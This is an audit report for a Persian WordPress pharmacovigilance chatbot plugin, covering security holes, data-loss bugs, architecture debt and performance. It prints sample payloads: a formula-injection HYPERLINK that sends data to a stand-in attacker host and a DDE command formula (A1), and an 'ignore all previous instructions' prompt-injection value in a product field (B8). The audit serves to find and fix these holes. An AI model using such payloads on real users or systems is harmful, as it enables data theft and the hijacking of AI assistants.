# PROJECT_AUDIT.md — Nafas Smart Chatbot (v3.1.0)

**Audit date:** 2026-07-04
**Scope:** Entire repository — `nafas-chatbot/` WordPress plugin (PHP core, AJAX/AI layer, DB layer, admin panel, Elementor widget, frontend JS/CSS, uninstall, i18n, tooling) plus repo-level files.
**Method:** Full manual code review of every file. No code was modified.

**Overall assessment:** This is a surprisingly capable plugin for its niche (Persian/RTL pharma chatbot with offline-first Q&A bank, lightweight RAG, multi-provider AI, pharmacovigilance forms). The security baseline is above average for a WordPress plugin (nonces everywhere, prepared statements, encrypted secrets, honeypot anti-spam, rate limiting). However, it carries **several real security weaknesses, multiple silent data-loss bugs, unbounded-input/statistics-poisoning vectors, scalability cliffs, accessibility gaps, and significant architectural debt** (a 1,370-line God class, no tests, no CI, full-DOM re-render UI). Details below.

---

# Part 1 – Complete Audit

Severity legend: 🔴 Critical · 🟠 High · 🟡 Medium · 🔵 Low / polish

---

## A. Security

### A1. 🔴 CSV formula injection (CSV export)
- **Where:** `includes/class-nafas-chatbot-admin.php` → `export_csv()`
- **What:** User-submitted values (`name`, `description`, `concomitant_drugs`, `batch_number`, `product`, `phone`) are written verbatim into the exported CSV. A visitor can submit a consultation form with a description like `=HYPERLINK("http://evil.example/?"&A1,"click")` or `=cmd|' /C calc'!A0`. When an admin opens the export in Excel/LibreOffice, the formula executes.
- **Why it matters:** This is a classic CSV/formula-injection attack against back-office staff — the export is exactly the file a pharmacovigilance officer will open in Excel.
- **Solution:** Escape any cell beginning with `=`, `+`, `-`, `@`, `\t`, `\r` by prefixing a single quote (`'`) or a space, per OWASP guidance.
- **Implementation:** Add a `csv_safe( $value )` helper in the admin class:
  ```php
  private static function csv_safe( $v ) {
      $v = (string) $v;
      return preg_match( '/^[=+\-@\t\r]/', $v ) ? "'" . $v : $v;
  }
  ```
  Map it over every row before `fputcsv()`.

### A2. 🟠 Session-based rate limiting is trivially bypassable
- **Where:** `class-nafas-chatbot-ajax.php` → `check_rate_limit()`
- **What:** In `session` mode, the bucket key is derived from a **client-supplied** `cid` POST field (generated in JS and stored in `localStorage`). An attacker simply sends a random `cid` per request and gets an unlimited quota. In `session` mode there is **no IP backstop at all**, so the AI budget (paid API tokens) can be drained.
- **Why:** Rate limiting exists specifically to protect a metered, paid resource (LLM API calls). A client-controlled key defeats the purpose.
- **Solution:** Never rely on a client-supplied identifier alone. In `session` mode, always keep a (higher) hard IP ceiling as backstop; alternatively derive the session key server-side (signed cookie: `hash_hmac( 'sha256', $random, AUTH_KEY )` issued by the server, validated on use).
- **Implementation:** In `check_rate_limit()`, when `$mode === 'session'`, also push an IP check with e.g. `10 × session_rate_limit` limit; document the change. Longer-term, issue the `cid` as an HttpOnly signed cookie from PHP instead of generating it in JS.

### A3. 🟠 Rate-limit counter is not atomic (race condition) and TTL slides
- **Where:** `check_rate_limit()` — `get_transient()` then `set_transient( $key, $n + 1, DAY_IN_SECONDS )`.
- **What:** Read-modify-write on a transient is racy under concurrency (parallel requests read the same count, both pass, both write `n+1` — the limit undercounts). Also, every increment resets the TTL to 24h, so the counter window slides instead of expiring at day boundary (the date is in the key so the practical effect is limited, but the transient rows persist longer than needed).
- **Solution:** Use the same atomic pattern already used for stats: a tiny `UPDATE ... SET cnt = cnt + 1` / `INSERT ... ON DUPLICATE KEY UPDATE` against the existing `nafas_chatbot_stats` table (metric = `rl:{bucket}:{hash}`), or `wp_cache_incr()` when a persistent object cache exists.
- **Implementation:** Add `Nafas_Chatbot_DB::rl_incr( $key, $limit )` returning the post-increment value; deny when `> $limit`. Purge `rl:` metrics older than 2 days in the daily cron.

### A4. 🟠 Unauthenticated statistics/feedback poisoning (no abuse controls on 4 endpoints)
- **Where:** `handle_feedback()`, `handle_csat()`, `handle_suggest()`, and `record_chat()` inside `handle_chat()`.
- **What:**
  1. `handle_feedback` lets any visitor set the rating of **any** `log_id` (sequential integers — fully enumerable), any number of times. An attacker can flip every logged answer to 👎, corrupting the "feedback" KPI the admin uses to tune the bot.
  2. `handle_csat` accepts unlimited CSAT votes per visitor — the "customer satisfaction" average is trivially fakeable.
  3. `handle_suggest` runs a full DB fetch + tokenizer scoring pass per keystroke with **no rate limit** (see also Performance D2) — a cheap DoS lever.
  4. `handle_chat` records `product:{$product_id}` stat metrics for **any client-supplied string**. An attacker can flood `nafas_chatbot_stats` with unbounded garbage metrics (also note `metric VARCHAR(80)` — longer values fail or truncate depending on SQL mode), polluting the "popular products" dashboard.
- **Solution:**
  - Feedback: only accept a rating for a `log_id` the client actually received — return a per-log HMAC token (`hash_hmac('sha256', $log_id, wp_salt())`) with the chat response and require it in the feedback call; ignore re-votes (only update rows where `rating = 0`).
  - CSAT: rate-limit per cid/IP (1 per session per day is plenty).
  - Suggest: include it in the rate limiter (`suggest` bucket, generous limit like 600/day).
  - Stats: validate `$_POST['product']` against `Nafas_Chatbot_Settings::products_map()` + `company_id`; map anything unknown to `general` before calling `record_chat()` and before using it in prompts.
- **Implementation:** All four fixes are localized to `class-nafas-chatbot-ajax.php` + one small change in `Nafas_Chatbot_DB::set_chatlog_rating()` (add `AND rating = 0` semantics via `$wpdb->query`).

### A5. 🟠 Gemini API key sent in the URL query string
- **Where:** `gemini_reply()` — `...:generateContent?key=<API_KEY>`.
- **What:** The key ends up in server-side HTTP logs, proxies, and any error traces that include the URL. Google explicitly supports the `x-goog-api-key` header for this reason.
- **Solution/Implementation:** Remove `?key=` and add `'x-goog-api-key' => $api_key` to the headers array in the `remote_json()` call. One-line change, no behavior change.

### A6. 🟡 Secret encryption is unauthenticated and silently degrades to plaintext
- **Where:** `class-nafas-chatbot-settings.php` → `encrypt()` / `decrypt()`.
- **What:**
  1. AES-256-CBC **without an HMAC** — ciphertexts are malleable (no integrity). Low practical impact here, but not best practice.
  2. If `openssl_encrypt` is unavailable or `AUTH_KEY` is undefined, the key is **silently stored as plaintext** with no admin warning.
  3. `openssl_random_pseudo_bytes()` is the legacy API; `random_bytes()` is the modern CSPRNG.
  4. If the site owner rotates `AUTH_KEY` (standard security advice), all stored keys silently decrypt to `''` and the chatbot dies with no explanation.
- **Solution:** Use `sodium_crypto_secretbox` (bundled with PHP ≥ 7.2) which is authenticated by design; keep a versioned prefix (`enc::v2::`) with fallback decryption of `v1` values; surface an admin notice when encryption is unavailable or when decryption of a stored secret fails ("re-enter your API key").
- **Implementation:** Add `encrypt_v2()`/`decrypt_v2()` using libsodium, re-encrypt lazily on next settings save, show `admin_notices` when `has_secret()` is true but `get_secret()` returns `''`.

### A7. 🟡 Adverse-event (ADR) data destroyed without safeguard
- **Where:** `uninstall.php` (drops all 5 tables unconditionally), `purge_old_submissions()` cron.
- **What:** Pharmacovigilance reports are **regulated records** in most jurisdictions (and per Iranian FDA/ADR reporting practice). Uninstalling the plugin — something an admin may do casually while debugging — irreversibly destroys all adverse-event reports. There is no "keep data on uninstall" option, no export-before-purge, and no warning.
- **Solution:** Add a settings toggle `delete_data_on_uninstall` (default **off**); `uninstall.php` must check it before dropping tables. For retention purges of ADR rows, consider anonymizing (blank name/phone/IP) instead of deleting, or auto-exporting a CSV to a protected uploads folder first.
- **Implementation:** Read the option directly with `get_option()` in `uninstall.php` (settings class isn't loaded there); wrap the `DROP TABLE` block in the check. Split retention settings so ADR submissions can have a different (longer/never) retention than consultations.

### A8. 🟡 `type` field of submissions is unvalidated free text
- **Where:** `handle_submit()` — `$type = sanitize_text_field( $_POST['type'] ?? 'نامشخص' )`.
- **What:** The submission type is client-controlled. Anything the attacker sends is stored and later becomes: a `GROUP BY type` key inflating `counts()`, a badge in the admin list, and part of the notification text. The ADR/consult distinction is then inferred by fragile substring matching (`mb_strpos( $type, 'عوارض' )`) in **four different places** (submit handler, dashboard, submissions view, notification builder).
- **Solution:** Whitelist a machine key: accept only `adr` or `consult` from the client, store the key, and map to display labels server-side. Keep the Persian label out of the data model entirely.
- **Implementation:** Add a `type` column migration path (store `adr`/`consult` in `type`, translate at render time); update the JS payload to send the key; update filters in the submissions page; keeps the DB clean and makes the logic i18n-safe.

### A9. 🟡 Iranian phone regex rejects Persian/Arabic digits
- **Where:** `handle_submit()` — `preg_match( '/^(\+98|0)?9\d{9}$/', $phone )`.
- **What:** A Persian user typing `۰۹۱۲۳۴۵۶۷۸۹` (Persian-indic digits — extremely common with Persian keyboards) is rejected with "invalid mobile number". This is simultaneously a validation bug and a major UX failure for the exact target audience.
- **Solution:** Normalize Eastern-Arabic/Persian digits to ASCII before validating (both server- and client-side), and strip spaces/dashes.
- **Implementation:** `strtr( $phone, array( '۰'=>'0', … '٩'=>'9' ) )` (both U+06F0–U+06F9 and U+0660–U+0669 ranges) + `preg_replace('/[\s\-]/','',$phone)` before the regex. Mirror in JS with a small `normalizeDigits()` on the phone field.

### A10. 🟡 Admin state-changing actions ride on GET requests
- **Where:** `handle_actions()` — status change, delete submission, delete chatlog row, add-to-bank, delete KB doc are all GET links (with nonces).
- **What:** Nonces mitigate CSRF, but GET-based mutations are still fragile: link prefetchers, browser accelerators and security scanners can trigger them; they end up in browser history and server logs; the shared nonce action (`nafas_sub_action`) is not per-item, so one leaked URL nonce authorizes actions on *any* row for that user session.
- **Solution:** Convert destructive actions to POST forms (or `admin-post.php` POST endpoints) with per-item nonces (`'nafas_sub_del_' . $id`).
- **Implementation:** Small `<form method="post">` wrappers (or JS-submitted forms) in the views; per-ID nonce action strings; handler switches from `$_GET` to `$_POST`.

### A11. 🔵 IP address handling & privacy
- **Where:** `get_ip()`, DB `ip` columns, `clientId` in localStorage.
- **What:** Full IPs are stored on every chat log and submission indefinitely (chatlog default 90 days; submissions default forever). The plugin registers privacy-policy text (good) but does **not** integrate with WordPress's personal-data **exporter/eraser** APIs. The persistent `nfx_cid` localStorage identifier is a tracking ID set without consent.
- **Solution:** (1) Register `wp_privacy_personal_data_exporters`/`_erasers` for submissions + chatlog keyed by phone/IP. (2) Offer an "anonymize IP" option (zero the last octet / last 80 bits). (3) Only set `nfx_cid` when the chat is actually opened, not on page load.
- **Implementation:** New `class-nafas-chatbot-privacy.php` with the two filter registrations; a `mask_ip()` helper used at insert time when enabled. (Note: `clientId` IIFE currently runs at script load — move it inside the toggle-open handler.)

### A12. 🔵 SSRF surface on admin-supplied URLs
- **Where:** `custom_endpoint`, `ai_webhook_url` → `wp_remote_post()`.
- **What:** Only administrators can set these, so risk is low, but a compromised admin session can make the server POST chat content (and bearer tokens) to internal addresses (`http://169.254.169.254/…`, `http://localhost:…`).
- **Solution:** Validate with `wp_http_validate_url()` (blocks loopback/reserved ranges unless filtered) and require HTTPS for endpoints carrying API keys.
- **Implementation:** In `save_settings()`, run both URLs through `wp_http_validate_url()`; reject + notice on failure.

### A13. 🔵 Webhook response-signature check is optional-by-silence
- **Where:** `webhook_reply()` — response HMAC is only verified **if the response happens to include the header**.
- **What:** A MITM/compromised endpoint can simply omit `x-nafas-signature` and the unauthenticated body is accepted, making the response signature security theater.
- **Solution:** When a secret is configured, add a toggle "require signed responses"; when on, reject responses without a valid signature.
- **Implementation:** One conditional around the existing verification block + a checkbox in the AI settings tab.

---

## B. Bugs & Logic Issues

### B1. 🔴 Q&A bank silently truncated by PHP `max_input_vars` (data loss)
- **Where:** `qa-bank-page.php` (renders **every** bank row as 4 form fields) + `save_qa_bank()` + `qa_replace_all()` (replaces the whole table with whatever was POSTed).
- **What:** PHP's default `max_input_vars` is 1000. With ~250 Q&A rows (4 inputs each + other fields), POST data is **silently truncated** — and because saving does DELETE-all + re-INSERT of what arrived, **every row beyond the cutoff is permanently deleted** with a success message. This is a catastrophic, invisible data-loss bug that will hit exactly when the bank grows to a useful size.
- **Solution:** Stop round-tripping the entire bank through one form. Give the bank page proper CRUD: paginated list, add/edit single rows via AJAX, delete individually. If keeping bulk save short-term: count received rows vs. `qa_count()` and refuse to replace when POST looks truncated (`count($_POST['qa_question']) < expected && ini_get('max_input_vars')` heuristic), and never delete rows that weren't displayed.
- **Implementation:** Convert `qa_replace_all()` usage to row-level `qa_update( $id, … )`/`qa_insert()`/`qa_delete( $id )` endpoints (admin-ajax with nonce), render the table paginated (50/page) with inline editing. This also fixes B2.

### B2. 🟠 `usage_count` wiped on every Q&A save
- **Where:** `qa_replace_all()` → each row re-inserted via `qa_insert()` with `usage_count => 0`.
- **What:** The "usage counter" (used to rank related-question suggestions by popularity) is reset to zero every time the admin touches the Q&A page — the ranking signal never accumulates.
- **Solution:** Preserve counters: update rows in place keyed by `id` (add a hidden `qa_id[]` field), or carry the old `usage_count` across the replace by matching on question text.
- **Implementation:** Covered by the row-level CRUD from B1; short-term fix: read old bank into a `question => usage_count` map before deleting and restore counts on insert.

### B3. 🟠 Impossible to delete the last product / last quick reply (and stale knowledge lingers)
- **Where:** `save_settings()` — `if ( ! empty( $products ) ) { $new['products'] = $products; }` and the same pattern for `quick_replies` (only updated when the labels array is present).
- **What:** If an admin removes all product rows and saves, `$products` is empty, so the old list is **silently kept** — the UI lies about the result. Removing the last quick-reply row has the same problem. Additionally `product_knowledge` is rebuilt only from the submitted rows, so deleting a product row properly (leaving ≥1) orphans nothing, but deleting *all* rows leaves both stale products and stale knowledge.
- **Solution:** Distinguish "field not submitted" from "submitted empty". Always include a hidden marker input (e.g. `<input type="hidden" name="products_present" value="1">`) and when present, save whatever was submitted — including an empty array.
- **Implementation:** Add the hidden field to the Products tab & quick replies section; in `save_settings()` gate on `isset( $in['products_present'] )` instead of `! empty( $products )`.

### B4. 🟠 Persian product IDs are silently discarded
- **Where:** `save_settings()` — `$pid = sanitize_key( $pid )`.
- **What:** `sanitize_key()` strips all non-`[a-z0-9_-]` characters. An admin who types a Persian ID (natural for this audience despite the "English" hint) gets an empty key, and the whole row **vanishes on save** with a success notice.
- **Solution:** Validate rather than mangle: if the raw ID doesn't match `/^[a-z0-9_-]+$/i`, either auto-generate a slug (`sanitize_title` → transliterate) or show an error notice naming the rejected row. Never silently drop data.
- **Implementation:** Collect rejected rows in `save_settings()`, pass them to the notice; or generate `product_{n}` fallback IDs.

### B5. 🟠 CSV import breaks on quoted multi-line answers
- **Where:** `parse_qa_import()` — splits content with `preg_split( '/\r\n|\r|\n/' )` then `str_getcsv()` per line.
- **What:** CSV fields may legally contain newlines inside quotes (long answers *will* have them — the sample file's own format encourages full-sentence answers). Line-splitting first corrupts every such record: the row is dropped (`count($cols) < 4`) and subsequent fragment-lines are misparsed, possibly importing garbage rows.
- **Solution:** Parse the file as a stream: write to `php://temp`, then loop `fgetcsv( $handle )` which handles embedded newlines correctly.
- **Implementation:** Replace the manual split with:
  ```php
  $fh = fopen( 'php://temp', 'r+' ); fwrite( $fh, $content ); rewind( $fh );
  while ( ( $cols = fgetcsv( $fh ) ) !== false ) { … }
  ```

### B6. 🟡 `created_at DATETIME DEFAULT '0000-00-00 00:00:00'` breaks on modern MySQL
- **Where:** All five `CREATE TABLE` statements in `class-nafas-chatbot-db.php`.
- **What:** MySQL 5.7+/8.0 default SQL modes (`NO_ZERO_DATE`, strict) reject zero dates. Depending on host config, `dbDelta()` either fails to create the tables (plugin silently broken on activation) or creates them without the default. This is a real activation-failure risk on modern hosting.
- **Solution:** Use `created_at DATETIME NOT NULL DEFAULT CURRENT_TIMESTAMP` (supported for DATETIME since MySQL 5.6.5/MariaDB 10.0) — the code always supplies the value anyway, so simply `NOT NULL` with no default is also fine.
- **Implementation:** Change the five SQL strings; bump `DB_VERSION` so `maybe_upgrade()` re-runs `dbDelta()`.

### B7. 🟡 CSAT is almost never shown (only on explicit "restart")
- **Where:** JS `restart()` — the CSAT card only appears when the user clicks the header restart button after a real conversation.
- **What:** Nearly all users end a chat by closing the window or navigating away; the restart button is a niche action. The CSAT metric therefore measures a heavily biased sliver of users, while the dashboard presents it as overall satisfaction.
- **Solution:** Also offer CSAT on close: intercept `closeChat()` after a real conversation and show the rating card once (or a lightweight inline version), with a session flag to avoid nagging.
- **Implementation:** In `closeChat()`, if `hadRealConversation() && ! state.csatDone`, push the csat item and keep the window open one beat, or record intent and show on next open. Simplest robust option: show CSAT stars inline under the last bot message after N minutes of inactivity.

### B8. 🟡 Fake product/company names leak into AI prompts
- **Where:** `generate_ai_reply()` — for unknown `product_id`, `$product_name = $product_id` (raw client string) and this is embedded into the system prompt ("موضوع جاری گفتگو: «…»").
- **What:** A visitor can set `product=IGNORE ALL PREVIOUS INSTRUCTIONS…` — a prompt-injection channel through a field that was never meant to carry free text. (History and message content are inherently user-controlled, but the *system prompt* should never interpolate unvalidated client input.)
- **Solution:** Same fix as A4/product validation — resolve `product_id` strictly against configured products; unknown → treat as `general` with no product clause in the system prompt.
- **Implementation:** One guard in `generate_ai_reply()` + `handle_chat()`.

### B9. 🟡 `related_questions()` double work & inconsistent source gating
- **Where:** `handle_chat()` — suggestions run `qa_candidates()` + full tokenization a second time after `bank_reply()` already did the identical work; also suggestions are generated for `cache` source but the *log id* logic and bank logic treat sources differently, and cached replies skip `record_chat`? (No — record_chat always runs, but cached replies skip logging to chatlog since `last_source='cache'` is not in the logged list, so 👍/👎 is silently unavailable for cached answers — inconsistent UX for identical content.)
- **Solution:** Compute candidates once per request and reuse across `bank_reply`, `kb_retrieve` (different table, keep separate) and `related_questions`; treat `cache` like `ai` for feedback logging (log the cache hit with `source='cache'` or reuse the original log id stored alongside the cached transient).
- **Implementation:** Cache `$this->qa_rows` per request; store `array( 'reply' => …, 'log_id' => … )` in the transient instead of the bare string.

### B10. 🟡 Office-hours check ignores minutes and the auto theme never updates
- **Where:** `Settings::is_online()` uses whole hours only (`office_end = 16` means offline at 16:00 sharp; no half-hour support). JS `applyTheme()` in `auto` mode reads `document.documentElement[data-theme]` **once at load** — it neither tracks OS `prefers-color-scheme` nor theme toggles by the site's dark-mode switcher.
- **Solution:** Store times as `HH:MM` strings and compare minutes; in JS, listen to `matchMedia('(prefers-color-scheme: dark)').addEventListener('change', …)` and a `MutationObserver` on `documentElement`'s `data-theme`/`class` for common dark-mode plugins.
- **Implementation:** `<input type="time">` fields; small observer block in `applyTheme()`.

### B11. 🔵 `wp_kses_post()` strips `aria-live` from the floating container
- **Where:** `maybe_render_floating()` → `echo wp_kses_post( $this->render() )`.
- **What:** The rendered container includes `aria-live="polite"`, but `aria-live` is not in KSES's default allowed attribute list, so the floating (most common) render path loses it while the shortcode path keeps it — inconsistent and accidental.
- **Solution:** The markup is plugin-generated constant HTML; escaping it through KSES adds nothing. Echo it directly (it contains no user input) or add the attribute via JS.
- **Implementation:** `echo $this->render(); // phpcs:ignore … -- static markup` or set attributes in JS where the root is ensured anyway.

### B12. 🔵 Duplicate `get_chat_stats()` call & dead code
- **Where:** `render_about_page()` calls `Nafas_Chatbot_DB::get_chat_stats()` twice (once inside `isset()`, once for the value); `register_menu()` computes `$counts = Nafas_Chatbot_DB::counts()` and never uses it; `record_chat()` accepts `$product_name` and ignores it; `normalize_fa()` is a pass-through wrapper around `normalize()`; `Nafas_Chatbot_Frontend::is_rendered()` is unused.
- **Solution/Implementation:** Trivial cleanups — call once into a variable, delete the dead statements/params. Reduces query count on every admin page load (see also D5).

### B13. 🔵 Typewriter effect fights the user and flashes markdown
- **Where:** JS `maybeTypewriter()`.
- **What:** During animation the bubble shows **raw markdown source** (`**bold**`, `- lists`) as plain text, then swaps to rendered HTML at the end — a visible flash/reflow. `scrollToBottom()` fires every 25 ms tick, so the user cannot scroll up to read earlier messages while a long answer animates.
- **Solution:** Animate over the rendered HTML (walk text nodes and reveal progressively, or use a CSS mask/fade-in per block); only autoscroll if the user is already at (or near) the bottom.
- **Implementation:** Track `body.scrollHeight - body.scrollTop - body.clientHeight < 40` before scrolling; render the final HTML immediately with a per-paragraph staggered fade as a simpler, robust alternative to character typing.

---

## C. Architecture, Code Quality & Technical Debt

### C1. 🟠 `Nafas_Chatbot_Ajax` is a 1,370-line God class
- **What:** One class owns: HTTP endpoint handlers, rate limiting, IP resolution, Persian NLP (normalization, tokenization, synonyms, scoring), the Q&A matcher, the RAG retriever, four AI provider clients, an HTTP JSON helper, webhook signing, notification building, Telegram/Bale delivery, and email delivery. Mutable side-channel state (`$last_source`, `$last_error`) couples methods invisibly.
- **Why:** Untestable, unreadable, every change risks unrelated regressions; provider logic can't be reused (the admin "test AI" duplicates the dispatch switch).
- **Solution:** Split by responsibility:
  - `Nafas_Provider_Interface` (`reply( $system, $messages ): Nafas_Ai_Result`) with `Gemini`, `Claude`, `OpenAI_Compatible`, `Webhook` implementations; a `Provider_Factory` used by both chat and test-connection.
  - `Nafas_Text` (static normalize/tokenize/synonyms), `Nafas_Matcher` (bank scoring), `Nafas_Retriever` (KB), `Nafas_Rate_Limiter`, `Nafas_Notifier`.
  - `Nafas_Ai_Result` value object carrying `reply`, `source`, `error` — kills the mutable `$last_*` fields.
- **Implementation:** Mechanical extraction, no behavior change; add a lightweight PSR-4 autoloader (composer `autoload` or a 10-line spl_autoload keyed on class prefix) to stop the manual `require_once` chain.

### C2. 🟠 Zero automated tests, no CI
- **What:** `composer.json` has only PHPCS. No PHPUnit, no integration tests (matcher/normalizer are *ideal* pure-function test targets), no JS tests, no lint for JS, no CI workflow.
- **Why:** The plugin has real algorithmic logic (Persian normalization, scoring thresholds, chunking, CSV parsing, encryption round-trip) where regressions are silent and only visible as "the bot got dumber."
- **Solution/Implementation:**
  - `composer require --dev phpunit/phpunit yoast/phpunit-polyfills brain/monkey` — unit-test `normalize`, `tokenize_fa`, `expand_synonyms`, `bank scoring`, `kb_chunk_text`, `parse_qa_import`, `encrypt/decrypt`, phone validation.
  - `wp-env` + `@wordpress/e2e-test-utils-playwright` for a smoke test (activate plugin, open widget, send message with fallback provider, submit ADR form).
  - GitHub Actions: PHPCS + PHPUnit matrix (PHP 7.4/8.1/8.3), ESLint/Prettier for JS, plugin-check action, and a build job producing the release zip (see C4).

### C3. 🟠 Frontend is one 1,294-line IIFE with full-DOM re-render
- **What:** `renderWindow()` rebuilds the **entire** window (header, all messages, footer input) via `innerHTML` on every state change. Consequences: O(n) DOM rebuild per message (O(n²) over a conversation), event listeners re-bound each time, the input element is recreated (mobile keyboard flicker, IME composition can drop), scroll position forcibly reset, screen readers re-announce the whole thread (see E-section), CSS enter-animations need `seen` bookkeeping hacks.
- **Solution:** Append-only rendering: keep a stable header/footer; append message nodes to the thread instead of rebuilding it; update chips by replacing only the chipset node. No framework needed — the item list is already append-mostly.
- **Implementation:** Refactor `render()` into `appendItem( it )` + `setChips( chips )` + `setLoading( bool )`; call sites already push single items. This removes `enterCls`/`state._lastUser` recomputation hacks and fixes the focus/scroll side effects at the root.

### C4. 🟡 Build artifact `nafas-chatbot.zip` committed to git
- **What:** A 118 KB zip snapshot of the plugin lives in the repo root — it drifts from source instantly, bloats history on every release, and invites "which one is current?" mistakes.
- **Solution:** Delete it from the repo; generate the distributable in CI (`git archive` or a `dist` script excluding dev files via `.distignore`) and attach it to GitHub Releases.
- **Implementation:** `git rm nafas-chatbot.zip`, add `*.zip` to `.gitignore`, add `.distignore`, add a release workflow.

### C5. 🟡 Duplicated query-builder logic
- **What:** `get_submissions()` and `get_filtered_for_export()` duplicate the identical WHERE-building block (type/status/search/date range). Any filter change must be made twice (they *will* drift).
- **Solution:** Extract `private static function build_where( $args ): array{ $sql, $params }` used by both (and by a future count endpoint).
- **Implementation:** Pure refactor within `class-nafas-chatbot-db.php`.

### C6. 🟡 Inconsistent declared platform support
- **What:** Plugin header says `Requires at least: 5.6` / `Requires PHP: 7.2`; `.phpcs.xml` says `minimum_supported_wp_version 5.9` and `testVersion 7.4-`; readme says `Requires at least: 5.6`. Nobody knows what's actually supported, and the code isn't tested on any of them.
- **Solution:** Pick honest floors (WP 6.0+, PHP 7.4+ is reasonable in 2026), align all three files, and enforce with `phpcompatibility/phpcompatibility-wp` in CI.
- **Implementation:** Header/readme/phpcs edits + composer dev dependency.

### C7. 🟡 Settings blob design: 60+ keys in one serialized option
- **What:** All settings — including per-product knowledge texts that can be tens of KB — live in one serialized array (`nafas_chatbot_settings`). Every partial save (`Settings::update`) rewrites the whole blob; concurrent saves (two tabs: settings + QA page) last-write-wins and can clobber each other's keys; the whole blob is read on every front-end request.
- **Solution:** Keep small config in the single option (fine), but move bulky content (`product_knowledge`) into the KB table (it *is* knowledge — the KB engine already exists), and version the settings schema.
- **Implementation:** Migration: for each `product_knowledge[pid]`, insert a KB document titled "دانش محصول {name}" with `product_id = pid`; drop the key. The `enqueue_with_config()` summary fallback reads from KB's first chunk instead.

### C8. 🔵 `flush_rewrite_rules()` cargo cult; cron scheduled from constructor
- **What:** The plugin registers no rewrite rules, so flushing on (de)activation is pointless work. `wp_next_scheduled()` + `wp_schedule_event()` run in the constructor on **every request** (front and admin) — a query per page load just to check.
- **Solution:** Remove the flushes. Schedule the cron on activation and re-add on `admin_init` only if missing (or check a cached flag).
- **Implementation:** Move scheduling into `nafas_chatbot_activate()`; keep a cheap guard (`get_option('nafas_cron_ok')`) for self-healing.

### C9. 🔵 README duplication & repo hygiene
- **What:** `README.md` and `README-FA.md` are byte-identical (both Persian) — the English README implied by the name doesn't exist. `.gitignore` is a WordPress-core template irrelevant to a plugin-only repo (ignores `/wp-admin/` etc. which will never exist here). Git history has commit messages like "up", "one", "one".
- **Solution:** Write a real English `README.md` (what it does, screenshots, setup, hooks/filters reference — the plugin has ~10 documented filters that are invisible today); replace `.gitignore` with plugin-appropriate entries (`vendor/`, `node_modules/`, `*.zip`, `.DS_Store`); adopt conventional commits.
- **Implementation:** Docs task; add a `docs/hooks.md` enumerating `nafas_chatbot_pre_reply`, `nafas_chatbot_synonyms`, `nafas_chatbot_bank_threshold`, `nafas_chatbot_ip_header`, etc.

### C10. 🔵 Elementor widget global function & escaping
- **What:** `Nafas_Chatbot()` (camel-case global function shadowing the class name) is defined at the bottom of the widget file — a landmine (fatal redeclare risk if the file is ever loaded twice; confusing `Nafas_Chatbot()` vs `Nafas_Chatbot::instance()`). The widget `render()` echoes unescaped with a phpcs:ignore where a `wp_kses` with an allowlist (`div` with id/class/dir/aria) would be strictly safer.
- **Solution:** Delete the helper (use `Nafas_Chatbot::instance()->frontend`), guard with `function_exists` if kept.
- **Implementation:** Two-line change in the widget.

---

## D. Performance & Scalability

### D1. 🟠 60-second synchronous AI calls hold PHP workers (capacity DoS)
- **Where:** `remote_json()` default timeout 60 s via admin-ajax.
- **What:** Every chat request occupies a PHP-FPM worker for the full provider latency. A dozen concurrent slow requests (or a provider outage where every request waits the full 60 s **before** falling back to the bank) can exhaust the worker pool and take the whole site down. There is **no circuit breaker**: when the provider is down, *every* user pays the 60 s timeout.
- **Solution:** (1) Circuit breaker: after N consecutive provider failures, set a transient (e.g. 2–5 min) that short-circuits straight to bank/fallback, with one probe request per window. (2) Reduce default timeout to ~30 s and make the setting visible. (3) Longer-term: streaming (see Part 2 R2).
- **Implementation:** `set_transient('nafas_ai_down_' . $provider, 1, 180)` on failure inside `generate_ai_reply()`; check before dispatch; clear on success.

### D2. 🟠 Autocomplete does a full candidate fetch + tokenize/score per keystroke
- **Where:** `handle_suggest()` → `qa_candidates()` (up to 800 rows) → normalize + tokenize + synonym-expand **every row** per request; fired by JS after a 250 ms debounce on each keypress.
- **What:** CPU cost is O(rows × tokens) per keystroke per user. With a few hundred bank rows and modest traffic this becomes the hottest code path on the site — for a convenience feature.
- **Solution:** (1) Cache the tokenized reference corpus (per product) in a transient/object cache invalidated on bank save — scoring then needs no re-tokenization. (2) Cache suggest results per normalized prefix for 10 min. (3) Rate-limit the endpoint (A4). (4) Raise the FULLTEXT pre-filter usefulness by lowering the 300-row threshold for the suggest path.
- **Implementation:** `Nafas_Matcher::corpus( $product_id )` backed by `wp_cache`/transient storing `[ id, tokens[], question ]`; bump a `nafas_qa_rev` option on every bank write for invalidation.

### D3. 🟡 Chat pipeline re-fetches and re-tokenizes candidates 2–3× per message
- **Where:** `bank_reply()` and `related_questions()` each call `qa_candidates()` + tokenize the full result; `kb_retrieve()` tokenizes every KB chunk per request even though `search_text` is precomputed (tokens are not).
- **Solution:** Compute the user-token set once; fetch candidates once per (table, product) per request; store precomputed token arrays alongside rows (see D2 corpus cache). For KB, persist the token list (JSON) at insert time.
- **Implementation:** Request-scoped memoization in the new `Nafas_Matcher`; extra `tokens` LONGTEXT column (JSON) filled at `kb_insert_document()`.

### D4. 🟡 External font CDN dependency contradicts the offline-first design
- **Where:** `register_assets()` loads Vazirmatn from `cdn.jsdelivr.net`.
- **What:** The plugin's entire pitch is resilience under sanctions/poor connectivity — yet the UI font depends on a foreign CDN that is intermittently slow/blocked in exactly that environment, adds a render-blocking third-party request, and leaks visitor IPs to a third party (GDPR-adjacent).
- **Solution:** Bundle the Vazirmatn woff2 subset locally in `assets/fonts/` with `font-display: swap` (license is OFL — permitted), keep a system-font fallback stack.
- **Implementation:** Vendor 2 weights (400/700), inline the `@font-face` in `nafas-chatbot.css` with local URLs, drop the CDN style handle.

### D5. 🟡 Admin menu badge runs COUNT queries on every admin page load
- **Where:** `register_menu()` — `counts()` (unused) plus a `COUNT(*) WHERE status='new'` on **every** wp-admin request, for every admin user, even on unrelated screens.
- **Solution:** Cache the new-count in a transient (60 s) invalidated on insert/status-change; drop the unused `counts()` call.
- **Implementation:** `nafas_new_count` transient; delete it inside `Nafas_Chatbot_DB::insert()` / `update_status()` / `delete()`.

### D6. 🟡 Notifications sent synchronously inside the user's submit request
- **Where:** `handle_submit()` → messenger POST (8 s timeout) + `wp_mail()` inline.
- **What:** The patient reporting an adverse event waits for Telegram/Bale + SMTP round-trips before seeing "success". On a slow SMTP day that's 10+ seconds of spinner for the most critical form in the product.
- **Solution:** Queue the notifications: respond to the user immediately after the DB insert, deliver via `wp_schedule_single_event( time(), 'nafas_notify', [ $id ] )` (or Action Scheduler if adopted), with one retry on failure.
